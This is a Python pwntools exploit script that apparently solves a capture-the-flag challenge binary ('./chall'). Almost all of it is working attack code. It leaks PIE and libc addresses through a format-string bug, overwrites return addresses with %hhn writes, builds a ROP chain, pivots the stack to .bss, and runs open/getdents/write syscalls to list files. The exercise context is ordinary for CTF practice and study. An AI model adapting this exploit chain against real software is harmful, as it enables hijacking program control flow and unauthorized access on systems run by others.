from pwn import *

HOST = ""
PORT = 11

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level="warn")
    p.sendlineafter(b">", payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn("located EIP/RIP offset at {a}".format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *syscall
c
c

""".format(
    **locals()
)

# Binary filename
exe = "./chall"

# use libc local

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"
context.terminal = "tmux split -h".split()

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = elf.libc
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
rop = ROP(elf)
# Start program
io = start()

# Build the payload
io.recvuntil(b"leak ")
LEAK = io.recvline().strip().decode()
PIE_BASE = int(LEAK[:-3] + "000", 16)
BUFFER_ADDR = int(LEAK, 16)
RET_VULN = BUFFER_ADDR - 0x18
RET_MAIN = BUFFER_ADDR + 0x18

# Overwrite vuln ret addr
payload = "%{}c%11$hhn|%27$p|%45$p|".format(0xE).encode().ljust(40, b"\x00")
payload += p64(RET_VULN)

io.sendlineafter(b">", payload)

io.recvuntil(b"|")
MAIN_ADDR = int(io.recvuntil(b"|", drop=True).decode(), 16)
VULN_ADDR = MAIN_ADDR - 135
LIBC_START_MAIN = int(io.recvuntil(b"|", drop=True).decode(), 16) - 128

libc.address = LIBC_START_MAIN - libc.sym["__libc_start_main"]
elf.address = MAIN_ADDR - elf.sym["main"]

POP_RSP = elf.address + 0x1585
POP_RAX = libc.address + 0x0000000000045EB0  # pop rax ; ret
POP_RDI = elf.address + 0x000000000000158B
POP_RSI = libc.address + 0x000000000002BE51  # pop rsi ; ret
POP_RDX_R15 = libc.address + 0x000000000011F497  # pop rdx ; pop r12 ; ret
SYSCALL = libc.search(asm("syscall; ret")).__next__()
RET = elf.address + 0x0000000000001016

BSS = elf.bss() + 0x600  # Writable area in the middle of bss


def syscall(rax, rdi, rsi, rdx):
    payload = p64(POP_RAX) + p64(rax)
    payload += p64(POP_RDI) + p64(rdi)
    payload += p64(POP_RSI) + p64(rsi)
    payload += p64(POP_RDX_R15) + p64(rdx) + p64(0)
    payload += p64(SYSCALL)

    return payload


info("BSS AREA :" + hex(BSS))

# Leak
info("PIE STACK BASE: " + hex(PIE_BASE))
info("BUFFER ADDR: " + hex(BUFFER_ADDR))
info("MAIN ADDR: " + hex(MAIN_ADDR))
info("VULN ADDR: " + hex(VULN_ADDR))
info("ELF ADDR: " + hex(elf.address))
info("LIBC ADDR: " + hex(libc.address))

# Move the stack to bss so its writable
ROP_CHAIN = [POP_RDI, BSS, libc.sym["gets"], POP_RSP, BSS + 24]


def make_offset(addr, length=1):
    len_format = 2 ** (length * 8) - 1
    offset = []

    for i in range(int(8 / length)):
        tmp = addr & len_format
        offset.append(tmp)
        addr >>= len_format.bit_length()

    return offset


def fmt_str(start_offset, where, what, length):
    sl_addr = make_offset(what, length)
    len_format = 2 ** (length * 8) - 1
    if length == 1:
        n = "hh"
    elif length == 2:
        n = "h"
    elif length == 4:
        n = ""
    else:
        return ""

    p_fmt = ""
    p_fmt += "%14c%16$hhn"
    p_fmt += "%{}c%{}${}n".format(sl_addr[0] - 14, start_offset, n)
    p_fmt += "%{}c%{}${}n".format(
        sl_addr[1] - sl_addr[0] + len_format + 1, start_offset + 1, n
    )
    p_fmt += "%{}c%{}${}n".format(
        sl_addr[2] - sl_addr[1] + len_format + 1, start_offset + 2, n
    )
    p_fmt = p_fmt.ljust(56, "a").encode()
    p_fmt += p64(where)  # tujuan
    p_fmt += p64(where + 1 * length)
    p_fmt += p64(where + 2 * length)
    p_fmt += p64(RET_VULN)

    return p_fmt


def clean_addr(start_offset, where):
    p_fmt = ""
    p_fmt += "%14c%16$hhn"
    p_fmt += "%{}$n".format(start_offset)
    p_fmt += "%{}$n".format(start_offset + 1)
    p_fmt = p_fmt.ljust(56, "a").encode()
    p_fmt += p64(where)  # tujuan
    p_fmt += p64(where + 4)
    p_fmt += p64(0)
    p_fmt += p64(RET_VULN)
    io.sendafter(b"> ", p_fmt)


for index, rop_address in enumerate(ROP_CHAIN):
    clean_addr(13, RET_VULN + 8 * (index + 1))
    payload = fmt_str(13, RET_VULN + 8 * (index + 1), rop_address, 2)
    io.sendafter(b">", payload)

# overwrite final ret to return
payload = "%{}c%11$hhn".format(0x2D).encode().ljust(40, b"\x00")
payload += p64(RET_VULN)
io.sendafter(b">", payload)

# Send the syscall using gets
sleep(0.5)
size = 0x600

payload = b"./".ljust(48, b"\x00")  # curdir
payload += syscall(constants.SYS_open, BSS, 0, 0)
payload += syscall(constants.SYS_getdents, 3, BSS + 0x600, size)
# payload += syscall(constants.SYS_read, 3, BSS + 0x600, size)
payload += syscall(constants.SYS_write, 1, BSS + 0x600, size)
io.sendline(payload)

# Got Shell?
io.interactive()
